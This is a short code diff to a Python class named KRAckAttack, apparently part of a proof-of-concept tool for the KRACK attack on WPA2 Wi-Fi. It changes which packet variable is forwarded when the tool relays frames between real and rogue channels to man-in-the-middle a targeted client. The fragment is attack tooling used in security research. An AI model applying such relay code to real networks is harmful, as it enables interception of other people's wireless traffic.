@@ -670,14 +670,14 @@ class KRAckAttack():
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(origin_p)
+						self.sock_rogue.send(p)
 					else:
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(origin_p)
+						self.sock_rogue.send(p)
 				# Group addressed frames
 				else:
 					print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-					self.sock_rogue.send(origin_p)
+					self.sock_rogue.send(p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -737,8 +737,8 @@ class KRAckAttack():
 				if will_forward:
 					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
 					if client.state < ClientState.Attack_Started:
-						origin_p.FCfield &= 0xFFEF
-					self.sock_real.send(origin_p)
+						p.FCfield &= 0xFFEF
+					self.sock_real.send(p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
